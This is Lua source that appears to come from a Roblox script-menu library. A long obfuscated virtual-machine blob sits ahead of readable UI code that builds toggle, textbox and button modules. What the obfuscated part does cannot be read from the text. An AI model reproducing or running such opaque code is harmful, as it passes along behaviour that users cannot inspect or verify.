while(o)/((3663-0x74e))==797 do if(h[l[x]]~=h[l[u]])then e=e+O;else e=l[f];end;break end;break;end break;end break;end while(o)/((684+-0x38))==4014 do o=(12710122)while d<=(124+-0x6b)do o-= o o=(248708)while d<=(0x44-53)do o-= o h[l[a]]=U[l[H]];e=e+b;l=k[e];h[l[F]]=#h[l[f]];e=e+b;l=k[e];U[l[P]]=h[l[F]];e=e+b;l=k[e];h[l[a]]=U[l[f]];e=e+b;l=k[e];h[l[a]]=#h[l[f]];e=e+b;l=k[e];U[l[P]]=h[l[K]];e=e+b;l=k[e];do return end;break;end while(o)/((-47+0x2b0))==388 do o=(276885)while(0x80/(0x790/242))<d do o-= o h[l[x]]=U[l[f]];break end while 945==(o)/((664-0x173))do h[l[F]]=#h[l[H]];break end;break;end break;end while(o)/((0x2cb37/55))==3818 do o=(4392045)while d<=(0x39-39)do o-= o local d;local o;h[l[a]]=m[l[p]];e=e+b;l=k[e];h[l[M]]=m[l[P]];e=e+b;l=k[e];h[l[x]]=l[p];e=e+b;l=k[e];h[l[x]]=l[H];e=e+b;l=k[e];h[l[a]]=l[L];e=e+b;l=k[e];o=l[M]h[o]=h[o](c(h,o+b,l[P]))e=e+b;l=k[e];h[l[B]]=h[l[p]][h[l[u]]];e=e+b;l=k[e];o=l[B]h[o]=h[o](h[o+O])e=e+b;l=k[e];d=h[l[w]];if not d then e=e+O;else h[l[B]]=d;e=l[f];end;break;end while(o)/((0x90a-1219))==4011 do o=(2585231)while d>(1805/0x5f)do o-= o local o=l[K]local e,l=s(h[o](c(h,o+1,l[p])))t=l+o-1 local l=0;for o=o,t do l=l+b;h[o]=e[l];end;break end while 2167==(o)/((2498-0x519))do h[l[x]]=h[l[p]][h[l[_]]];break end;break;end break;end break;end break;end break;end while(o)/(((20354+-0x1a)/11))==3963 do o=(2622644)while(0x48+-41)>=d do o-= o o=(1109576)while(174-0x95)>=d do o-= o o=(4168980)while(-16+0x26)>=d do o-= o o=(299265)while d>(0x9d-136)do o-= o h[l[a]]=h[l[P]]-h[l[_]];break end while 1405==(o)/(((-22140/0xb4)+0x150))do local l=l[x]h[l](h[l+O])break end;break;end while 1035==(o)/((8099-0xfe7))do o=(2280368)while d<=(3795/0xa5)do o-= o local e=l[f];local o=h[e]for l=e+1,l[C]do o=o..h[l];end;h[l[M]]=o;break;end while 794==(o)/((-0x48+2944))do o=(1296999)while(142-(-0x51+199))<d do o-= o h[l[F]][h[l[H]]]=h[l[i]];break end while 363==(o)/((0x3ece8/72))do if not h[l[K]]then e=e+O;else e=l[r];end;break end;break;end break;end break;end while(o)/((0x3a7-481))==2444 do o=(9708336)while(-106+0x86)>=d do o-= o o=(10449798)while(0xa0-134)>=d do o-= o m[l[P]]=h[l[a]];break;end while 3866==(o)/((5455-0xac0))do o=(3938055)while d>(0x9a-127)do o-= o local o=l[M]h[o]=h[o](c(h,o+b,l[f]))break end while(o)/((3220-0x659))==2469 do local l={h,l};l[b][l[n][x]]=l[n][u]+l[n][r];break end;break;end break;end while(o)/((167072/0x2e))==2673 do o=(2783702)while d<=(163-0x86)do o-= o m[l[P]]=h[l[M]];e=e+b;l=k[e];h[l[M]]={};e=e+b;l=k[e];h[l[K]]={};e=e+b;l=k[e];m[l[H]]=h[l[B]];e=e+b;l=k[e];h[l[B]]=m[l[r]];e=e+b;l=k[e];if(h[l[a]]~=l[i])then e=e+O;else e=l[f];end;break;end while(o)/((0x7e84a/226))==1214 do o=(10218)while d>(3240/0x6c)do o-= o h[l[M]]={};break end while(o)/((0xb3-153))==393 do do return h[l[M]]end break end;break;end break;end break;end break;end while 667==(o)/(((676349+-0x2d)/0xac))do o=(6762663)while d<=(0x7f-(18291/0xc9))do o-= o o=(2282716)while(0x1ad/13)>=d do o-= o o=(2165904)while(0xac-140)<d do o-= o local l={h,l};l[O][l[n][F]]=l[b][l[n][i]]+l[O][l[n][f]];break end while 534==(o)/((-0x20+4088))do e=l[r];break end;break;end while(o)/((0xa55-1374))==1796 do o=(3638320)while d<=(1496/0x2c)do o-= o h[l[a]]=D(N[l[P]],nil,m);break;end while(o)/((2991+-0x47))==1246 do o=(3036342)while d>(0x91+-110)do o-= o if(h[l[B]]~=l[i])then e=e+O;else e=l[r];end;break end while(o)/((-61+0xa2c))==1194 do h[l[B]]=m[l[r]];break end;break;end break;end break;end while(o)/((10086/0x6))==4023 do o=(2026072)while d<=(0x3a8/(-0x14+44))do o-= o o=(5326225)while(0x1abd/185)>=d do o-= o h[l[K]]=h[l[r]][l[u]];break;end while(o)/((0x41441/197))==3925 do o=(1370610)while(-118+0x9c)<d do o-= o h[l[B]]=(l[r]~=0);e=e+O;break end while(o)/((1000-0x211))==2910 do h[l[x]]=(l[r]~=0);break end;break;end break;end while 1004==(o)/((2132+-0x72))do o=(4454272)while d<=(0xb0-136)do o-= o local l=l[x]h[l]=h[l](c(h,l+b,t))break;end while 1472==(o)/((0x17ed-3099))do o=(5622695)while d>(0x10a8/104)do o-= o h[l[K]]=(l[f]~=0);e=e+O;break end while 3761==(o)/((1604+-0x6d))do h[l[x]]=l[p];break end;break;end break;end break;end break;end break;end break;end while(o)/((-95+0xd8))==1817 do o=(9045948)while((24208-0x2f50)/189)>=d do o-= o o=(15135960)while(0x1aea/130)>=d do o-= o o=(3367081)while(10716/0xe4)>=d do o-= o o=(9048780)while d<=(0x2aa0/248)do o-= o o=(8636515)while(-0x7f+170)<d do o-= o h[l[a]][h[l[H]]]=h[l[_]];break end while(o)/((4612-0x93f))==3847 do if not h[l[M]]then e=e+O;else e=l[f];end;break end;break;end while 2340==(o)/((0xbaee2/(296+-0x62)))do o=(8414042)while(5130/0x72)>=d do o-= o local l=l[K]h[l]=h[l](h[l+O])break;end while 2158==(o)/((-90+0xf95))do o=(1344218)while d>(0x70-66)do o-= o do return end;break end while 439==(o)/((0x32162/67))do local e=l[a];local o=h[l[P]];h[e+1]=o;h[e]=o[l[_]];break end;break;end break;end break;end while 1847==(o)/((-0x7a+1945))do o=(567084)while d<=(0x7e+-76)do o-= o o=(8002260)while d<=(10512/0xdb)do o-= o m[l[P]]=h[l[x]];break;end while(o)/((5320-0xa96))==3066 do o=(2193448)while(0x8d-92)<d do o-= o h[l[B]]=h[l[P]][h[l[C]]];break end while(o)/((1217-0x28e))==3896 do h[l[F]]=l[f];break end;break;end break;end while(o)/((-0x4c+1018))==602 do o=(2695000)while(-0x3b+110)>=d do o-= o h[l[K]]=h[l[H]]-h[l[i]];break;end while(o)/((1411+-0x24))==1960 do o=(361125)while d>(150-0x62)do o-= o local l={h,l};l[O][l[n][B]]=l[b][l[n][w]]+l[O][l[n][f]];break end while(o)/((72750/0xc2))==963 do e=l[r];break end;break;end break;end break;end break;end while(o)/((0xf2d0/16))==3896 do o=(263262)while d<=(143-0x55)do o-= o o=(529214)while(7260/0x84)>=d do o-= o o=(5940473)while((0x6af8/168)+-109)<d do o-= o local d;local o;h[l[x]]=m[l[H]];e=e+b;l=k[e];h[l[M]]=m[l[r]];e=e+b;l=k[e];h[l[M]]=l[f];e=e+b;l=k[e];h[l[K]]=l[P];e=e+b;l=k[e];h[l[a]]=l[L];e=e+b;l=k[e];o=l[F]h[o]=h[o](c(h,o+b,l[r]))e=e+b;l=k[e];h[l[B]]=h[l[P]][h[l[i]]];e=e+b;l=k[e];o=l[M]h[o]=h[o](h[o+O])e=e+b;l=k[e];d=h[l[w]];if not d then e=e+O;else h[l[x]]=d;e=l[H];end;break end while 3017==(o)/((4007-0x7f6))do h[l[K]]={};break end;break;end while(o)/((67774/0x2f))==367 do o=(46110)while d<=(0xb28/51)do o-= o local o=h[l[u]];if not o then e=e+O;else h[l[a]]=o;e=l[P];end;break;end while 1537==(o)/((-51+0x51))do o=(5508360)while d>(10317/0xb5)do o-= o h[l[x]]();break end while 1430==(o)/(((0xd8036/113)-0xf8a))do h[l[B]]();break end;break;end break;end break;end while(o)/((607-0x154))==986 do o=(692514)while(-108+0xa9)>=d do o-= o o=(3245898)while d<=(0xac-113)do o-= o local o=l[x]h[o]=h[o](c(h,o+b,l[P]))break;end while 3282==(o)/((85054/0x56))do o=(12748958)while(192-0x84)<d do o-= o h[l[x]]=h[l[L]]%l[w];break end while 3847==(o)/((-65+0xd33))do local o=l[B]local e,l=s(h[o](c(h,o+1,l[L])))t=l+o-1 local l=0;for o=o,t do l=l+b;h[o]=e[l];end;break end;break;end break;end while(o)/((1977-0x3eb))==711 do o=(4205805)while d<=((-26051/0xef)+0xab)do o-= o local e=l[M];local o=h[l[f]];h[e+1]=o;h[e]=o[l[w]];break;end while 1091==(o)/((-31+0xf2e))do o=(125250)while(0xba-123)<d do o-= o do return end;break end while(o)/((0x43d-584))==250 do local o;h[l[B]]=m[l[L]];e=e+b;l=k[e];h[l[x]]=m[l[r]];e=e+b;l=k[e];h[l[B]]=l[f];e=e+b;l=k[e];h[l[B]]=l[P];e=e+b;l=k[e];h[l[a]]=l[f];e=e+b;l=k[e];o=l[M]h[o]=h[o](c(h,o+b,l[L]))e=e+b;l=k[e];h[l[x]]=h[l[r]][h[l[w]]];e=e+b;l=k[e];o=l[M]h[o]=h[o](h[o+O])e=e+b;l=k[e];h[l[a]]=h[l[r]];e=e+b;l=k[e];e=l[r];break end;break;end break;end break;end break;end break;end while(o)/((0x93858/204))==3054 do o=(6049608)while(0xc5+-122)>=d do o-= o o=(4851992)while d<=(-0x30+117)do o-= o o=(1262300)while d<=(192+-0x7e)do o-= o o=(6214276)while(191+-0x7e)<d do o-= o local d;local n,M;local O;local o;h[l[K]]=m[l[P]];e=e+b;l=k[e];o=l[F];O=h[l[p]];h[o+1]=O;h[o]=O[l[g]];e=e+b;l=k[e];h[l[a]]=m[l[f]];e=e+b;l=k[e];h[l[B]]=l[P];e=e+b;l=k[e];h[l[F]]=l[H];e=e+b;l=k[e];h[l[B]]=l[p];e=e+b;l=k[e];o=l[a]h[o]=h[o](c(h,o+b,l[P]))e=e+b;l=k[e];o=l[K]n,M=s(h[o](c(h,o+1,l[L])))t=M+o-1 d=0;for l=o,t do d=d+b;h[l]=n[d];end;e=e+b;l=k[e];o=l[F]h[o]=h[o](c(h,o+b,t))e=e+b;l=k[e];h[l[F]]();break end while(o)/(((0xd49f8-435490)/147))==2098 do local d;local o;h[l[x]]=m[l[f]];e=e+b;l=k[e];h[l[M]]=m[l[L]];e=e+b;l=k[e];h[l[K]]=l[L];e=e+b;l=k[e];h[l[M]]=l[r];e=e+b;l=k[e];h[l[F]]=l[H];e=e+b;l=k[e];o=l[B]h[o]=h[o](c(h,o+b,l[L]))e=e+b;l=k[e];h[l[B]]=h[l[L]][h[l[u]]];e=e+b;l=k[e];o=l[a]h[o]=h[o](h[o+O])e=e+b;l=k[e];d=h[l[i]];if not d then e=e+O;else h[l[B]]=d;e=l[P];end;break end;break;end while(o)/((1369-0x2cf))==1942 do o=(5421856)while d<=(0x135e/74)do o-= o local d=N[l[H]];local b;local o={};b=G({},{__index=function(e,l)local l=o[l];return l[1][l[2]];end,__newindex=function(h,l,e)local l=o[l]l[1][l[2]]=e;end;});for b=1,l[w]do e=e+O;local l=k[e];if l[(0x3b-58)]==4 then o[b-1]={h,l[f]};else o[b-1]={U,l[H]};end;S[#S+1]=o;end;h[l[x]]=D(d,b,m);break;end while(o)/((-0x21+(0x19b1-3332)))==1688 do o=(4125630)while(0xe0-156)<d do o-= o local o=h[l[w]];if not o then e=e+O;else h[l[x]]=o;e=l[r];end;break end while(o)/((209050/0xb9))==3651 do h[l[x]]=U[l[f]];break end;break;end break;end break;end while 2603==(o)/((424992/0xe4))do o=(3451915)while(133+-0x3d)>=d do o-= o o=(894969)while d<=((-0x61+360)-0xc1)do o-= o h[l[B]]=h[l[P]][l[u]];break;end while(o)/((0x2ced7/161))==783 do o=(430032)while d>(240-0xa9)do o-= o h[l[B]]=#h[l[r]];break end while(o)/((0xcd+-19))==2312 do if(h[l[x]]==h[l[w]])then e=e+O;else e=l[L];end;break end;break;end break;end while(o)/((0x711+(-0x5e+24)))==1985 do o=(58004)while(-0x13+92)>=d do o-= o local d=N[l[r]];local b;local o={};b=G({},{__index=function(e,l)local l=o[l];return l[1][l[2]];end,__newindex=function(h,l,e)local l=o[l]l[1][l[2]]=e;end;});for b=1,l[C]do e=e+O;local l=k[e];if l[(100-0x63)]==4 then o[b-1]={h,l[f]};else o[b-1]={U,l[P]};end;S[#S+1]=o;end;h[l[M]]=D(d,b,m);break;end while 853==(o)/((0xd2-142))do o=(7184189)while d>((-0x2a+163)+-47)do o-= o local o=l[K];local b=h[o]local d=h[o+2];if(d>0)then if(b>h[o+1])then e=l[H];else h[o+3]=b;end elseif(b<h[o+1])then e=l[L];else h[o+3]=b;end break end while(o)/(((-12078/0xc6)+1862))==3989 do local l=l[M]h[l]=h[l](c(h,l+b,t))break end;break;end break;end break;end break;end while(o)/((7115-0xdf3))==1707 do o=(5267479)while(0x11d0/57)>=d do o-= o o=(11137420)while(198-0x79)>=d do o-= o o=(581803)while(-82+0x9e)<d do o-= o local o=l[a];local d=h[o+2];local b=h[o]+d;h[o]=b;if(d>0)then if(b<=h[o+1])then e=l[f];h[o+3]=b;end elseif(b>=h[o+1])then e=l[P];h[o+3]=b;end break end while 3853==(o)/((0xa9+-18))do h[l[M]]=h[l[H]];break end;break;end while(o)/((-0x6f+4139))==2765 do o=(3009987)while d<=(15366/0xc5)do o-= o if(h[l[B]]~=h[l[C]])then e=e+O;else e=l[p];end;break;end while(o)/((2461-0x502))==2553 do o=(9821190)while(0xb0-97)<d do o-= o U[l[f]]=h[l[K]];break end while(o)/((8088-0xfd5))==2434 do local l={h,l};l[b][l[n][B]]=l[n][C]+l[n][f];break end;break;end break;end break;end while(o)/((0xaaa+-71))==1981 do o=(8292573)while d<=(0x115-194)do o-= o o=(3637440)while d<=(-106+0xbb)do o-= o local l=l[F]h[l](h[l+O])break;end while 1263==(o)/((2919+-0x27))do o=(1353744)while(-0x70+194)<d do o-= o local o;local d;h[l[F]]=m[l[H]];e=e+b;l=k[e];h[l[M]]=l[P];e=e+b;l=k[e];h[l[M]]=l[r];e=e+b;l=k[e];d=l[H];o=h[d]for l=d+1,l[g]do o=o..h[l];end;h[l[F]]=o;e=e+b;l=k[e];if h[l[a]]then e=e+b;else e=l[P];end;break end while(o)/((0x350-440))==3318 do h[l[B]]=m[l[p]];break end;break;end break;end while(o)/((0x86c+-125))==4083 do o=(5555550)while(-18+(294-0xc0))>=d do o-= o h[l[M]]=h[l[P]]%l[i];break;end while 2275==(o)/((0x136c-2530))do o=(7092300)while d>(180+-0x5f)do o-= o local o=l[x];local b=h[o]local d=h[o+2];if(d>0)then if(b>h[o+1])then e=l[f];else h[o+3]=b;end elseif(b<h[o+1])then e=l[P];else h[o+3]=b;end break end while(o)/((6142-0xc34))==2350 do local e=l[r];local o=h[e]for l=e+1,l[_]do o=o..h[l];end;h[l[B]]=o;break end;break;end break;end break;end break;end break;end break;end e+= O end;end);end;return D(v(),{},Y())()end)_msec({[((3176892/0xb3)/116)]='\115\116'..(function(l)return(l and'(247-(380-0xe9))')or'\114\105'or'\120\58'end)((1070/0xd6)==(0x80-122))..'\110g',[(-72+0x33a)]='\108\100'..(function(l)return(l and'(0x135-209)')or'\101\120'or'\119\111'end)((955/0xbf)==(-33+(0x77+-80)))..'\112',[(554-0x122)]=(function(l)return(l and'(14500/0x91)')and'\98\121'or'\100\120'end)((83-0x4e)==(135-0x82))..'\116\101',[(0x12118/232)]='\99'..(function(l)return(l and'(0x5078/206)')and'\90\19\157'or'\104\97'end)((73-0x44)==(22+-0x13))..'\114',[(0x4a0-614)]='\116\97'..(function(l)return(l and'(248-0x94)')and'\64\113'or'\98\108'end)((0x78-114)==(76+-0x47))..'\101',[(0x228+-111)]=(function(l)return(l and'(0x7d+-25)')or'\115\117'or'\78\107'end)((657/0xdb)==((-15750/0xd2)+106))..'\98',[(192500/0xdc)]='\99\111'..(function(l)return(l and'(-0x31+149)')and'\110\99'or'\110\105\103\97'end)((109-(0x5f+-17))==((-16393/0xa9)+128))..'\97\116',[(1421-0x2db)]=(function(l,o)return(l and'(0x128-196)')and'\48\159\158\188\10'or'\109\97'end)((0x4e-73)==(46-0x28))..'\116\104',[(202760/0x94)]=(function(l,o)return((0x5f/19)==(0xbd/63)and'\48'..'\195'or l..((not'\20\95\69'and'\90'..'\180'or o)))or'\199\203\95'end),[(0x787-990)]='\105\110'..(function(l,o)return(l and'(0xc4+-96)')and'\90\115\138\115\15'or'\115\101'end)((10/0x2)==(-102+0x85))..'\114\116',[(1133+-0x42)]='\117\110'..(function(l,o)return(l and'(118+(-4536/0xfc))')or'\112\97'or'\20\38\154'end)((0x1c-23)==(0x6c8/56))..'\99\107',[(0x1c138/100)]='\115\101'..(function(l)return(l and'(4400/0x2c)')and'\110\112\99\104'or'\108\101'end)((0x44-63)==(0xcb7/105))..'\99\116',[((0x16650/36)-0x514)]='\116\111\110'..(function(l,o)return(l and'(290-0xbe)')and'\117\109\98'or'\100\97\120\122'end)((0x2c+-39)==(-0x44+73))..'\101\114'},{[(142-0x62)]=((getfenv))},((getfenv))()) end)();end)        
    base_class.menu_create_module = function(self, text, Type, nohotkey) 
        Type = Type or 'Toggle'
        local M_IndexOffset = self.ZIndex+1
        
        if (Type == 'Toggle') then 
            ModListInit(text)
            
            
            
            
            local m_ModuleRoot
             local m_ModuleBackground
              local m_ModuleEnableEffect
               local m_ModuleEnableEffect2
              local m_Highlight
              local m_ModuleText
               local m_TextPadding
              local m_ModuleIcon
             local m_Menu
              local m_MenuListLayout
            
            do
                m_ModuleRoot = instNew('ImageButton')
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.AutomaticSize = 'Y'
                m_ModuleRoot.ClipsDescendants = false
                m_ModuleRoot.BackgroundTransparency = 1
                m_ModuleRoot.BorderSizePixel = 0
                m_ModuleRoot.ZIndex = M_IndexOffset-1
                m_ModuleRoot.Parent = self.Menu
                
                 m_ModuleBackground = instNew('Frame')
                 m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                 m_ModuleBackground.BackgroundTransparency = RLTHEMEDATA['bo'][2]
                 m_ModuleBackground.BorderSizePixel = 0
                 m_ModuleBackground.Size = dimNew(1,0,0,25)
                 m_ModuleBackground.ZIndex = M_IndexOffset
                 m_ModuleBackground.Parent = m_ModuleRoot
                 
                  m_Highlight = instNew('Frame')
                  m_Highlight.Active = false
                  m_Highlight.BackgroundColor3 = RLTHEMEDATA['ge'][1]
                  m_Highlight.BackgroundTransparency = 0.9
                  m_Highlight.BorderSizePixel = 0
                  m_Highlight.Size = dimScale(1,1)
                  m_Highlight.Visible = false
                  m_Highlight.ZIndex = M_IndexOffset
                  m_Highlight.Parent = m_ModuleBackground
                  
                  m_ModuleEnableEffect = instNew('Frame')
                  m_ModuleEnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleEnableEffect.BackgroundTransparency = 0.92
                  m_ModuleEnableEffect.BorderSizePixel = 0
                  m_ModuleEnableEffect.ClipsDescendants = true
                  m_ModuleEnableEffect.Size = dimNew(0,0,1,0)
                  m_ModuleEnableEffect.ZIndex = M_IndexOffset
                  m_ModuleEnableEffect.Parent = m_ModuleBackground
                  
                   m_ModuleEnableEffect2 = instNew('Frame')
                   m_ModuleEnableEffect2.BackgroundColor3 = RLTHEMEDATA['ge'][1]
                   m_ModuleEnableEffect2.BorderSizePixel = 0
                   m_ModuleEnableEffect2.Size = dimNew(0,2,1,0)
                   m_ModuleEnableEffect2.ZIndex = M_IndexOffset
                   m_ModuleEnableEffect2.Parent = m_ModuleEnableEffect
                  
                  m_ModuleText = instNew('TextLabel')
                  m_ModuleText.BackgroundTransparency = 1
                  m_ModuleText.Font = RLTHEMEFONT
                  m_ModuleText.Position = dimOffset(0, 0)
                  m_ModuleText.RichText = true
                  m_ModuleText.Size = dimScale(1, 1)
                  m_ModuleText.Text = text
                  m_ModuleText.TextColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleText.TextSize = 20
                  m_ModuleText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                  m_ModuleText.TextStrokeTransparency = 0
                  m_ModuleText.TextXAlignment = 'Left'
                  m_ModuleText.ZIndex = M_IndexOffset
                  m_ModuleText.Parent = m_ModuleBackground
                  
                   m_TextPadding = instNew('UIPadding')
                   m_TextPadding.PaddingLeft = dimOffset(IndentLevel1, 0).X -- LEFT PADDING 1
                   m_TextPadding.Parent = m_ModuleText
                  
                  m_ModuleIcon = instNew('TextLabel')
                  m_ModuleIcon.AnchorPoint = vec2(1,0)
                  m_ModuleIcon.BackgroundTransparency = 1
                  m_ModuleIcon.Font = RLTHEMEFONT
                  m_ModuleIcon.Position = dimScale(1,0)
                  m_ModuleIcon.Rotation = 0
                  m_ModuleIcon.Size = dimOffset(25, 25)
                  m_ModuleIcon.Text = '+'
                  m_ModuleIcon.TextColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleIcon.TextSize = 18
                  m_ModuleIcon.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                  m_ModuleIcon.TextStrokeTransparency = 0
                  m_ModuleIcon.TextXAlignment = 'Center'
                  m_ModuleIcon.ZIndex = M_IndexOffset
                  m_ModuleIcon.Parent = m_ModuleBackground
                
                m_Menu = instNew('Frame')
                m_Menu.BackgroundColor3 = RLTHEMEDATA['bs'][1]
                m_Menu.BackgroundTransparency = 1
                m_Menu.BorderSizePixel = 0
                m_Menu.Position = dimOffset(0,25)
                m_Menu.Size = dimNew(1,0,0,0)
                m_Menu.Visible = false
                m_Menu.ZIndex = M_IndexOffset-1
                m_Menu.Parent = m_ModuleRoot
                
                 m_MenuListLayout = instNew('UIListLayout')
                 m_MenuListLayout.FillDirection = 'Vertical'
                 m_MenuListLayout.SortOrder = 2
                 m_MenuListLayout.HorizontalAlignment = 'Left'
                 m_MenuListLayout.VerticalAlignment = 'Top'
                 m_MenuListLayout.Parent = m_Menu
                 
            end
                
            local M_Object = {} do 
                loadSettings()
                M_Object.Tooltip = nil
                
                M_Object.MToggled = false
                M_Object.OToggled = false
                
                M_Object.Flags = {} do 
                    M_Object.Flags['Enabled'] = true
                    M_Object.Flags['Disabled'] = true
                    M_Object.Flags['Toggled'] = true
                end
                
                M_Object.Name = text
                M_Object.Menu = m_Menu
                M_Object.Icon = m_ModuleIcon
                M_Object.Effect = m_ModuleEnableEffect
                M_Object.ZIndex = M_IndexOffset
                
                M_Object.Highlight = m_Highlight
                
                M_Object.Parent = self
                M_Object.Root = m_ModuleRoot
                
                M_Object.addToggle = base_class.module_create_toggle
                M_Object.AddLabel = base_class.module_create_label
                M_Object.addDropdown = base_class.module_create_dropdown
                M_Object.addModHotkey = base_class.module_create_modhotkey
                M_Object.AddHotkey = base_class.module_create_hotkey
                M_Object.addSlider = base_class.module_create_slider
                M_Object.AddInput = base_class.module_create_input
                M_Object.AddButton = base_class.module_create_button
                
                M_Object.setvis = base_class.module_setvis
                
                M_Object.Toggle = base_class.module_toggle_self
                M_Object.Disable = base_class.module_toggle_disable
                M_Object.Enable = base_class.module_toggle_enable
                M_Object.Reset = base_class.module_toggle_reset
                
                M_Object.ToggleMenu = base_class.module_toggle_menu
                M_Object.getState = base_class.module_getstate_self
                M_Object.isEnabled = base_class.module_getstate_self
                M_Object.GetMenuState = base_class.module_getstate_menu
                
                M_Object.Connect = base_class.generic_connect
                M_Object.setTooltip = base_class.generic_tooltip
            end
            
            do
                if not Configs[text] then
                    Configs[text] = {["Keybind"] = "", ["IsToggled"] = "", ["MenuToggled"] = "", ["Extras"] = {}}
                end
                if Configs[text] then
                    if Configs[text]["IsToggled"] == true then
                        M_Object:Toggle(true)
                    end
                    if Configs[text]["MenuToggled"] == true then
                        M_Object:ToggleMenu()
                    end
                end
                m_ModuleBackground.InputBegan:Connect(function(io) 
                    local uitv = io.UserInputType.Value
                    if (uitv == 0) then
                        M_Object:Toggle()
                        return
                    end
                    
                    if (uitv == 1) then
                        M_Object:ToggleMenu()
                        return
                    end
                end)
                
                m_ModuleBackground.MouseEnter:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['ho'][1]
                    
                    
                    local tt = M_Object.Tooltip
                    if (tt) then
                        w_Tooltip.Text = tt
                        w_TooltipHeader.Text = M_Object.Name
                        w_TooltipHeader.Visible = true
                    end
                end)
                
                m_ModuleBackground.MouseLeave:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                    
                    if (w_Tooltip.Text == M_Object.Tooltip) then
                        w_TooltipHeader.Visible = false
                    end
                end)
            end
            
            if (not nohotkey) then
                M_Object:addModHotkey() 
            end
            
            tabInsert(ui_Modules, M_Object)
            return M_Object
        elseif (Type == 'Textbox') then
            local m_ModuleRoot
             local m_ModuleBackground
             local m_ModuleEnableEffect
              local m_ModuleText
               local m_ModulePadding
              local m_ModuleIcon
            do
                m_ModuleRoot = instNew('Frame')
                m_ModuleRoot.AutomaticSize = 'Y'
                m_ModuleRoot.BackgroundTransparency = 1
                m_ModuleRoot.BorderSizePixel = 0
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.ZIndex = M_IndexOffset-1
                m_ModuleRoot.Parent = self.Menu
                
                 m_ModuleBackground = instNew('Frame')
                 m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                 m_ModuleBackground.BackgroundTransparency = RLTHEMEDATA['bo'][2]
                 m_ModuleBackground.BorderSizePixel = 0
                 m_ModuleBackground.Size = dimNew(1,0,0,25)
                 m_ModuleBackground.ZIndex = M_IndexOffset
                 m_ModuleBackground.Parent = m_ModuleRoot
                 
                  m_ModuleEnableEffect = instNew('Frame')
                  m_ModuleEnableEffect.BackgroundColor3 = RLTHEMEDATA['tm'][1]
                  m_ModuleEnableEffect.BackgroundTransparency = 1
                  m_ModuleEnableEffect.BorderSizePixel = 0
                  m_ModuleEnableEffect.ClipsDescendants = true
                  m_ModuleEnableEffect.Size = dimNew(1,0,1,0)
                  m_ModuleEnableEffect.ZIndex = M_IndexOffset
                  m_ModuleEnableEffect.Parent = m_ModuleBackground
                 
                 m_ModuleText = instNew('TextBox')
                 m_ModuleText.BackgroundTransparency = 1
                 m_ModuleText.ClearTextOnFocus = not nohotkey
                 m_ModuleText.Font = RLTHEMEFONT
                 m_ModuleText.Size = dimScale(1, 1)
                 m_ModuleText.Text = text
                 m_ModuleText.TextColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleText.TextSize = 20
                 m_ModuleText.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                 m_ModuleText.TextStrokeTransparency = 0
                 m_ModuleText.TextWrapped = true
                 m_ModuleText.TextXAlignment = 'Left'
                 m_ModuleText.ZIndex = M_IndexOffset
                 m_ModuleText.Parent = m_ModuleBackground
                  
                  m_ModulePadding = instNew('UIPadding')
                  m_ModulePadding.PaddingLeft = dimOffset(IndentLevel1, 0).X
                  m_ModulePadding.Parent = m_ModuleText
                 
                 m_ModuleIcon = instNew('TextLabel')
                 m_ModuleIcon.Size = dimOffset(25, 25)
                 m_ModuleIcon.Position = dimScale(1,0)
                 m_ModuleIcon.AnchorPoint = vec2(1,0)
                 m_ModuleIcon.BackgroundTransparency = 1
                 m_ModuleIcon.Font = RLTHEMEFONT
                 m_ModuleIcon.TextXAlignment = 'Center'
                 m_ModuleIcon.TextColor3 = RLTHEMEDATA['tm'][1]
                 m_ModuleIcon.TextSize = 18
                 m_ModuleIcon.Text = '🅃'
                 m_ModuleIcon.TextStrokeTransparency = 0
                 m_ModuleIcon.TextStrokeColor3 = RLTHEMEDATA['to'][1]
                 m_ModuleIcon.Rotation = 0
                 m_ModuleIcon.ZIndex = M_IndexOffset
                 m_ModuleIcon.Parent = m_ModuleBackground
            end
                
            local M_Object = {} do 
                M_Object.Tooltip = nil
                
                
                M_Object.Flags = {} do 
                    M_Object.Flags['Focused'] = true
                    M_Object.Flags['Unfocused'] = true
                    M_Object.Flags['TextChanged'] = true
                end
                
                M_Object.Effect = m_ModuleEnableEffect
                
                M_Object.Name = text
                M_Object.ZIndex = M_IndexOffset
                                    
                M_Object.Connect = base_class.generic_connect
                M_Object.setTooltip = base_class.generic_tooltip
            end
            
            do
                m_ModuleBackground.MouseEnter:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['ho'][1]
                    
                    
                    local tt = M_Object.Tooltip
                    if (tt) then
                        w_Tooltip.Text = tt
                        w_TooltipHeader.Text = M_Object.Name
                        w_TooltipHeader.Visible = true
                    end
                end)
                
                m_ModuleBackground.MouseLeave:Connect(function() 
                    m_ModuleBackground.BackgroundColor3 = RLTHEMEDATA['bo'][1]
                    
                    if (w_Tooltip.Text == M_Object.Tooltip) then
                        w_TooltipHeader.Visible = false
                    end
                end)
                
                m_ModuleText.FocusLost:Connect(function(enter) 
                    pcall(M_Object.Flags.Unfocused, m_ModuleText.Text, enter)
                    if (not nohotkey) then 
                        m_ModuleText.Text = M_Object.Name
                    end
                end)
                m_ModuleText.Focused:Connect(function() 
                    pcall(M_Object.Flags.Focused)
                end)
                m_ModuleText:GetPropertyChangedSignal('Text'):Connect(function() 
                    pcall(M_Object.Flags.TextChanged, m_ModuleText.Text)
                end)
            end
            
            tabInsert(ui_Modules, M_Object)
            return M_Object
        elseif (Type == 'Button') then
            local m_ModuleRoot
             local m_ModuleBackground
              local m_Highlight
              local m_ModuleEnableEffect
              local m_ModuleText
               local m_ModulePadding
              local m_ModuleIcon
            do
                m_ModuleRoot = instNew('Frame')
                m_ModuleRoot.Size = dimNew(1, 0, 0, 25)
                m_ModuleRoot.AutomaticSize = 'Y'
